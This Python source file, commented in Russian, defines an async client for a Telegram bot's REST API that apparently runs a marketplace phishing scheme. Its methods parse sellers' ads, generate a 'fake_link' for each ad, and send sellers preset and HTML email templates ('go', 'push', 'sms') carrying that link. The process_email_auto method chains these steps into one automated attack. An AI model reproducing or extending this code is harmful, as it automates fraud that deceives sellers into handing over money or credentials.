"""
HTTP клиент для взаимодействия с REST API бота
Используется вместо Telethon userbot для управления ботом
"""

import httpx
import asyncio
import logging
from typing import Optional, Dict, Any

logger = logging.getLogger(__name__)


class BotAPIClient:
    """Клиент для взаимодействия с REST API Telegram бота"""
    
    def __init__(self, base_url: str = "http://localhost:3000", timeout: int = 240):
        """
        Args:
            base_url: Базовый URL API (по умолчанию http://localhost:3000)
            timeout: Таймаут запросов в секундах (увеличен до 240 для очень медленных прокси с ретраями)
        """
        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        logger.info(f"BotAPIClient инициализирован: {self.base_url}, timeout={timeout}s")
    
    async def _request(
        self, 
        method: str, 
        endpoint: str, 
        data: Optional[Dict] = None,
        params: Optional[Dict] = None
    ) -> Dict[str, Any]:
        """
        Внутренний метод для выполнения HTTP запросов
        
        Args:
            method: HTTP метод (GET, POST)
            endpoint: Эндпоинт API (например, /api/start_send)
            data: JSON данные для POST запроса
            params: Query параметры для GET запроса
            
        Returns:
            JSON ответ от API
            
        Raises:
            httpx.HTTPError: При ошибке HTTP запроса
        """
        url = f"{self.base_url}{endpoint}"
        
        try:
            async with httpx.AsyncClient(timeout=self.timeout) as client:
                if method.upper() == "GET":
                    response = await client.get(url, params=params)
                elif method.upper() == "POST":
                    response = await client.post(url, json=data)
                else:
                    raise ValueError(f"Неподдерживаемый HTTP метод: {method}")
                
                response.raise_for_status()
                result = response.json()
                
                logger.info(f"API {method} {endpoint}: {response.status_code}")
                return result
                
        except httpx.HTTPError as e:
            logger.error(f"❌ HTTP ошибка {method} {endpoint}: {e}")
            raise
        except Exception as e:
            logger.error(f"❌ Ошибка запроса {method} {endpoint}: {e}")
            raise
    
    
    async def start_send(self, tg_user_id: int) -> Dict[str, Any]:
        """
        Запускает рассылку для пользователя
        
        Args:
            tg_user_id: Telegram ID пользователя
            
        Returns:
            {
                "success": true/false,
                "data": {
                    "status": "started",
                    "ready_count": 15,
                    "message": "Send started successfully"
                }
            }
        """
        logger.info(f"🚀 Запуск рассылки для пользователя {tg_user_id}")
        return await self._request("POST", "/api/start_send", data={
            "tg_user_id": tg_user_id
        })
    
    async def stop_send(self, tg_user_id: int) -> Dict[str, Any]:
        """
        Останавливает рассылку для пользователя
        
        Args:
            tg_user_id: Telegram ID пользователя
            
        Returns:
            {
                "success": true/false,
                "data": {
                    "status": "stopping",
                    "message": "Send stop requested"
                }
            }
        """
        logger.info(f"🛑 Остановка рассылки для пользователя {tg_user_id}")
        return await self._request("POST", "/api/stop_send", data={
            "tg_user_id": tg_user_id
        })
    
    async def get_send_status(self, tg_user_id: int) -> Dict[str, Any]:
        """
        Получает статус рассылки
        
        Args:
            tg_user_id: Telegram ID пользователя
            
        Returns:
            {
                "success": true/false,
                "data": {
                    "is_running": true,
                    "sent": 5,
                    "total": 15,
                    ...
                }
            }
        """
        logger.info(f"📊 Получение статуса рассылки для {tg_user_id}")
        return await self._request("GET", "/api/send_status", params={
            "tg_user_id": tg_user_id
        })
    
    async def get_user_info(self, tg_user_id: int) -> Dict[str, Any]:
        """
        Получает информацию о пользователе
        
        Args:
            tg_user_id: Telegram ID пользователя
            
        Returns:
            {
                "success": true/false,
                "data": {
                    "telegram_id": 123456789,
                    "username": "john_doe",
                    "role": "user",
                    "team": "tsum",
                    ...
                }
            }
        """
        logger.info(f"👤 Получение информации о пользователе {tg_user_id}")
        return await self._request("GET", "/api/user_info", params={
            "tg_user_id": tg_user_id
        })
    
    async def forward_file(
        self, 
        tg_user_id: int, 
        file_id: str, 
        caption: Optional[str] = None,
        target_bot: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Пересылает файл через бота
        
        Args:
            tg_user_id: Telegram ID пользователя
            file_id: ID файла в Telegram
            caption: Подпись к файлу (опционально)
            target_bot: Целевой бот для пересылки (опционально)
            
        Returns:
            {
                "success": true/false,
                "data": {
                    "message": "File forwarded successfully",
                    "target_chat": "@another_bot"
                }
            }
        """
        logger.info(f"📎 Пересылка файла {file_id} для пользователя {tg_user_id}")
        data = {
            "tg_user_id": tg_user_id,
            "file_id": file_id
        }
        if caption:
            data["caption"] = caption
        if target_bot:
            data["target_bot"] = target_bot
            
        return await self._request("POST", "/api/forward_file", data=data)
    
    async def start_parsing(self, user_id: int = 7787819135) -> Dict[str, Any]:
        """
        Запускает парсинг (2 парсинга подряд)
        Первый файл сразу пересылается, второй кладется в очередь
        
        Args:
            user_id: ID пользователя (по умолчанию 7787819135)
            
        Returns:
            {
                "success": true/false,
                "data": {
                    "message": "Парсинг запущен (2 файла будут получены)",
                    "command": "start_parsing"
                }
            }
        """
        logger.info(f"🚀 Запуск парсинга для пользователя {user_id}")
        return await self._request("POST", "/api/start_parsing", data={
            "user_id": user_id
        })
    
    async def send_next_parsing_file(self, user_id: int = 7787819135) -> Dict[str, Any]:
        """
        Отправляет следующий файл из очереди парсинга
        Вызывается после завершения рассылки
        
        Args:
            user_id: ID пользователя (по умолчанию 7787819135)
            
        Returns:
            {
                "success": true/false,
                "data": {
                    "message": "Команда на отправку следующего файла создана",
                    "command": "send_next_file"
                }
            }
        """
        logger.info(f"📤 Отправка команды send_next_file для пользователя {user_id}")
        return await self._request("POST", "/api/parsing_next_file", data={
            "user_id": user_id
        })
    
    async def get_parsing_status(self, user_id: int = 7787819135) -> Dict[str, Any]:
        """
        Получает статус парсинга
        
        Args:
            user_id: ID пользователя (по умолчанию 7787819135)
            
        Returns:
            {
                "success": true/false,
                "data": {
                    "status": "waiting_for_mailing",
                    "queue_count": 1,
                    "files": ["file2.xlsx"],
                    "last_forwarded": "file1.xlsx"
                }
            }
        """
        logger.info(f"📊 Получение статуса парсинга для пользователя {user_id}")
        return await self._request("GET", "/api/parsing_status", params={
            "user_id": user_id
        })
    
    async def get_ad_info(self, tg_user_id: int, ad_id: int) -> Dict[str, Any]:
        """
        Получает информацию об объявлении
        
        Args:
            tg_user_id: Telegram ID пользователя
            ad_id: ID объявления
            
        Returns:
            {
                "success": true/false,
                "data": {
                    "id": 1742694,
                    "title": "iPhone 15 Pro Max",
                    "price": "120000",
                    "photo": "https://...",
                    "link": "https://...",
                    "fake_link": "https://...",
                    "person_dot_name": "john.doe",
                    "email": "john.doe@example.com",
                    "status": 2
                }
            }
        """
        logger.info(f"📋 Получение информации об объявлении {ad_id}")
        return await self._request("GET", "/api/ad_info", params={
            "tg_user_id": tg_user_id,
            "ad_id": ad_id
        })
    
    async def generate_link(self, tg_user_id: int, ad_id: int) -> Dict[str, Any]:
        """
        Создает фейковую ссылку для объявления
        
        Args:
            tg_user_id: Telegram ID пользователя
            ad_id: ID объявления
            
        Returns:
            {
                "success": true/false,
                "data": {
                    "ad_id": 1742694,
                    "fake_link": "https://fake-domain.com/1742694",
                    "message": "Fake link generated successfully"
                }
            }
        """
        logger.info(f"🔗 Генерация фейковой ссылки для объявления {ad_id}")
        return await self._request("POST", "/api/generate_link", data={
            "tg_user_id": tg_user_id,
            "ad_id": ad_id
        })
    
    async def answer_message_preset(
        self, 
        tg_user_id: int, 
        ad_id: int, 
        preset_id: int
    ) -> Dict[str, Any]:
        """
        Отправляет ответ на письмо используя пресет
        
        Args:
            tg_user_id: Telegram ID пользователя
            ad_id: ID объявления
            preset_id: ID пресета для отправки
            
        Returns:
            {
                "success": true/false,
                "data": {
                    "ad_id": 1742694,
                    "email": "john.doe@example.com",
                    "type": "preset",
                    "message": "Answer message queued successfully"
                }
            }
        """
        logger.info(f"📤 Отправка пресета {preset_id} для объявления {ad_id}")
        return await self._request("POST", "/api/answer_message", data={
            "tg_user_id": tg_user_id,
            "ad_id": ad_id,
            "type": "preset",
            "preset_id": preset_id
        })
    
    async def answer_message_html(
        self, 
        tg_user_id: int, 
        ad_id: int, 
        html_type: str,
        fake_link: str = None,
        from_name: str = None
    ) -> Dict[str, Any]:
        """
        Отправляет ответ на письмо используя HTML шаблон
        
        Args:
            tg_user_id: Telegram ID пользователя
            ad_id: ID объявления
            html_type: Тип HTML шаблона ("back", "go", "push", "sms")
            fake_link: Опциональная фейковая ссылка (если уже сгенерирована)
            from_name: Имя отправителя письма (для персонализации)
            
        Returns:
            {
                "success": true/false,
                "data": {
                    "ad_id": 1742694,
                    "email": "john.doe@example.com",
                    "type": "html",
                    "message": "Answer message queued successfully"
                }
            }
        """
        logger.info(f"📄 Отправка HTML шаблона '{html_type}' для объявления {ad_id}")
        data = {
            "tg_user_id": tg_user_id,
            "ad_id": ad_id,
            "type": "html",
            "html_type": html_type
        }
        
        if fake_link:
            data["fake_link"] = fake_link
            logger.info(f"   Использую fake_link: {fake_link}")
        
        if from_name:
            data["from_name"] = from_name
            logger.info(f"   Персонализация для: {from_name}")
        
        return await self._request("POST", "/api/answer_message", data=data)
    
    async def get_send_status(self, tg_user_id: int) -> Dict[str, Any]:
        """
        Получает статус рассылки пользователя
        
        Args:
            tg_user_id: Telegram ID пользователя
            
        Returns:
            {
                "success": true/false,
                "data": {
                    "status": "in_progress" | "not_running",
                    "current_index": 5,
                    "total_ads": 10,
                    "sent": 5,
                    "message": "Sending in progress..."
                }
            }
        """
        logger.info(f"📊 Получение статуса рассылки для пользователя {tg_user_id}")
        return await self._request("GET", "/api/send_status", params={
            "tg_user_id": tg_user_id
        })
    
    
    async def health_check(self) -> bool:
        """
        Проверяет доступность API
        
        Returns:
            True если API доступен, False иначе
        """
        try:
            async with httpx.AsyncClient(timeout=5) as client:
                response = await client.get(f"{self.base_url}/health")
                return response.status_code == 200
        except:
            return False
    
    async def process_email_auto(
        self,
        tg_user_id: int,
        ad_id: int,
        preset_id: int = 1,
        html_type: str = "go",
        from_name: str = None
    ) -> Dict[str, Any]:
        """
        Автоматически обрабатывает письмо: создает ссылку, отправляет пресет и HTML
        
        Args:
            tg_user_id: Telegram ID пользователя
            ad_id: ID объявления
            preset_id: ID пресета для отправки (по умолчанию 1)
            html_type: Тип HTML шаблона (по умолчанию "go")
            from_name: Имя отправителя письма (для персонализации)
            
        Returns:
            Словарь с результатами всех операций
        """
        results = {
            "link_generated": False,
            "preset_sent": False,
            "html_sent": False,
            "errors": []
        }
        
        try:
            logger.info(f"[1/3] 🔗 Генерация ссылки для объявления {ad_id}")
            link_result = await self.generate_link(tg_user_id, ad_id)
            fake_link = None
            
            if link_result.get("success"):
                results["link_generated"] = True
                fake_link = link_result.get("data", {}).get("fake_link")
                logger.info(f"✅ Ссылка успешно создана: {fake_link}")
            else:
                error = f"Ошибка генерации ссылки: {link_result.get('error')}"
                results["errors"].append(error)
                logger.error(error)
                return results
            
            logger.info(f"[2/3] 📤 Отправка пресета {preset_id}")
            preset_result = await self.answer_message_preset(tg_user_id, ad_id, preset_id)
            if preset_result.get("success"):
                results["preset_sent"] = True
                preset_from = preset_result.get("data", {}).get("from", "unknown")
                results["preset_email"] = preset_from
                logger.info(f"✅ Пресет успешно отправлен с: {preset_from}")
            else:
                error = f"Ошибка отправки пресета: {preset_result.get('error')}"
                results["errors"].append(error)
                logger.error(error)
                return results
            
            logger.info(f"[3/3] 📄 Отправка HTML шаблона '{html_type}'")
            html_result = await self.answer_message_html(tg_user_id, ad_id, html_type, fake_link=fake_link, from_name=from_name)
            if html_result.get("success"):
                results["html_sent"] = True
                html_from = html_result.get("data", {}).get("from", "unknown")
                results["html_email"] = html_from
                logger.info(f"✅ HTML шаблон успешно отправлен с: {html_from}")
            else:
                error = f"Ошибка отправки HTML: {html_result.get('error')}"
                results["errors"].append(error)
                logger.error(error)
            
            all_success = results["link_generated"] and results["preset_sent"] and results["html_sent"]
            
            if all_success:
                logger.info("✅ Письмо полностью обработано!")
            else:
                logger.warning(f"⚠️ Письмо обработано с ошибками: {results['errors']}")
            
            return results
            
        except Exception as e:
            error = f"Критическая ошибка при обработке письма: {e}"
            results["errors"].append(error)
            logger.error(error, exc_info=True)
            return results
